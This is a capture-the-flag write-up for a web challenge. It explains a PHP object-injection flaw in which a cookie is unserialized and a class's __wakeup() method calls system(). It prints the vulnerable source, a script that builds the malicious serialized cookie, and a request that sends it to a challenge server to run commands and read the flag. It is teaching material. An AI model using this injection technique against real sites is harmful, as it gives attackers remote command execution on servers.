# Want More Biscuits

- Level: hard
- Points: 200
- Category: Web

All we know in the begining is that the author of the website loves vim, so immediately we're looking for backups of the source code created automatically by vim. After a few tries, we find one under the name `index.php~`

```php
<?php
// I love PHP.
class User {
        public $userName = 'anonymous';
}

class MyExec {
    public $command = "ls";
    public functin __wakeup()
    {
        system($this->command);
    }
}

$cookie_name = "userCookie";
$u = new User();
$cookie_value = base64_encode(serialize($u));
setcookie($cookie_name, $cookie_value, time() + (86400 * 30), "/"); // 86400 = 1 day

if(!isset($_COOKIE[$cookie_name])) {
        echo "Sorry something went wrong.";
} else {
        $u = unserialize(base64_decode($_COOKIE[$cookie_name]));
}

?>
```
We have an object injection through the cookie because of this line `$u = unserialize(base64_decode($_COOKIE[$cookie_name]));`  and we are looking to trigger the `__wakeup()` method of the `MyExec` class, which means we have to trigger a seralization of an instance of `MyExec` through the injection.

# Solution

We use this script to generate the cookie
```php
<?php
class MyExec {
    public $command = "ls";
    public function __wakeup() {
        system($this->command);
    }
}

print urlencode(base64_encode(serialize(new MyExec())));
?>
```
We now have our cookie injection `Tzo2OiJNeUV4ZWMiOjE6e3M6NzoiY29tbWFuZCI7czoyOiJscyI7fQ%3D%3D1`, we can use it with the python requests library or just send it using a browser extension `requests.get('http://35.225.49.73/wantmorebiscuits/src/', cookies={'userCookie': 'Tzo2OiJNeUV4ZWMiOjE6e3M6NzoiY29tbWFuZCI7czoyOiJscyI7fQ%3D%3D1'})`
At runtime `$u = unserialize(base64_decode($_COOKIE[$cookie_name]));` will become `$u = unserialize(serialize(new MyExec()));` and the `__wakeup()` method will trigger, executing ls.

![Imgur](https://i.imgur.com/5Fo17hN.png)

We then access the `Flag_FGRRDAKKUGBSKKIUHDLLMNEJDK.txt` directory and find the flag.

![Imgur](https://i.imgur.com/lvkw0HN.png)

# Flag

`FLAG{GOD_DAMN_SERIALIZE}`
